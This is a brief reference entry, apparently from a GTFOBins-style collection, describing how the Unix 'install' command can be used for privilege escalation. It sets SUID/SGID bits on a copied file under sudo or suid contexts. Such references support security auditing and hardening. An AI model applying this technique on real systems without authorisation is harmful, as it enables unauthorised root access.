---
type: gtfobin
name: install
platform: Unix
functions: [privilege-escalation]
tags: [gtfobin, unix, lotl]
---

# install

## privilege-escalation

```bash
install -m 6777 /path/to/input-file /path/to/output-dir/
```
_This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file._
**Contexts:** sudo, suid
